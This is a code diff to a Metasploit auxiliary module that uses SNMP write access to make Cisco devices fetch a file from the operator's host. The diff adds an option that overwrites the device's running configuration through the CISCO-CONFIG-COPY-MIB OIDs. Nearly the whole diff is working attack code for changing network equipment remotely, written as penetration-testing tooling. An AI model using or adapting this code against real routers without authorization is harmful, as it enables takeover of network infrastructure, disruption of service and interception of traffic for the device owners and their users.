@@ -82,12 +82,21 @@ class MetasploitModule < Msf::Auxiliary
     begin
       lhost = datastore['LHOST'] || Rex::Socket.source_address(ip)
 
+      # OID variables to copy a file
       ciscoFlashCopyCommand = "1.3.6.1.4.1.9.9.10.1.2.1.1.2."
       ciscoFlashCopyProtocol = "1.3.6.1.4.1.9.9.10.1.2.1.1.3."
       ciscoFlashCopyServerAddress  = "1.3.6.1.4.1.9.9.10.1.2.1.1.4."
       ciscoFlashCopySourceName = "1.3.6.1.4.1.9.9.10.1.2.1.1.5."
       ciscoFlashCopyDestinationName = "1.3.6.1.4.1.9.9.10.1.2.1.1.6."
       ciscoFlashCopyEntryStatus = "1.3.6.1.4.1.9.9.10.1.2.1.1.11."
+
+      # OID variables to override the running config
+      ccCopyProtocol = "1.3.6.1.4.1.9.9.96.1.1.1.1.2."
+      ccCopySourceFileType = "1.3.6.1.4.1.9.9.96.1.1.1.1.3."
+      ccCopyDestFileType  = "1.3.6.1.4.1.9.9.96.1.1.1.1.4."
+      ccCopyServerAddress = "1.3.6.1.4.1.9.9.96.1.1.1.1.5."
+      ccCopyFileName = "1.3.6.1.4.1.9.9.96.1.1.1.1.6."
+      ccCopyEntryRowStatus = "1.3.6.1.4.1.9.9.96.1.1.1.1.14."
 
       session = rand(255) + 1
 
@@ -105,20 +114,44 @@ class MetasploitModule < Msf::Auxiliary
       # If the above line didn't throw an error, the host is alive and the community is valid
       print_status("Copying file #{@filename} to #{ip}...")
 
-      varbind = SNMP::VarBind.new("#{ciscoFlashCopyProtocol}#{session}" , SNMP::Integer.new(1))
-      value = snmp.set(varbind)
+      #If the user chose to override the running config, set these OIDs
+      if(datastore['OVERRIDE_CONFIG'])
 
-      varbind = SNMP::VarBind.new("#{ciscoFlashCopyServerAddress}#{session}", SNMP::IpAddress.new(lhost))
-      value = snmp.set(varbind)
+        varbind = SNMP::VarBind.new("#{ccCopyProtocol}#{session}" , SNMP::Integer.new(1))
+        value = snmp.set(varbind)
 
-      varbind = SNMP::VarBind.new("#{ciscoFlashCopySourceName}#{session}", SNMP::OctetString.new(@filename))
-      value = snmp.set(varbind)
+        varbind = SNMP::VarBind.new("#{ccCopySourceFileType}#{session}" , SNMP::Integer.new(1))
+        value = snmp.set(varbind)
 
-      varbind = SNMP::VarBind.new("#{ciscoFlashCopyDestinationName}#{session}", SNMP::OctetString.new(@filename))
-      value = snmp.set(varbind)
+        varbind = SNMP::VarBind.new("#{ccCopyDestFileType}#{session}" , SNMP::Integer.new(4))
+        value = snmp.set(varbind)
 
-      varbind = SNMP::VarBind.new("#{ciscoFlashCopyEntryStatus}#{session}" , SNMP::Integer.new(1))
-      value = snmp.set(varbind)
+        varbind = SNMP::VarBind.new("#{ccCopyServerAddress}#{session}", SNMP::IpAddress.new(lhost))
+        value = snmp.set(varbind)
+
+        varbind = SNMP::VarBind.new("#{ccCopyFileName}#{session}", SNMP::OctetString.new(@filename))
+        value = snmp.set(varbind)
+
+        varbind = SNMP::VarBind.new("#{ccCopyEntryRowStatus}#{session}" , SNMP::Integer.new(1))
+        value = snmp.set(varbind)
+
+      # Otherwise, just upload the file using these OIDs
+      else
+        varbind = SNMP::VarBind.new("#{ciscoFlashCopyProtocol}#{session}" , SNMP::Integer.new(1))
+        value = snmp.set(varbind)
+
+        varbind = SNMP::VarBind.new("#{ciscoFlashCopyServerAddress}#{session}", SNMP::IpAddress.new(lhost))
+        value = snmp.set(varbind)
+
+        varbind = SNMP::VarBind.new("#{ciscoFlashCopySourceName}#{session}", SNMP::OctetString.new(@filename))
+        value = snmp.set(varbind)
+
+        varbind = SNMP::VarBind.new("#{ciscoFlashCopyDestinationName}#{session}", SNMP::OctetString.new(@filename))
+        value = snmp.set(varbind)
+
+        varbind = SNMP::VarBind.new("#{ciscoFlashCopyEntryStatus}#{session}" , SNMP::Integer.new(1))
+        value = snmp.set(varbind)
+      end
 
 
 
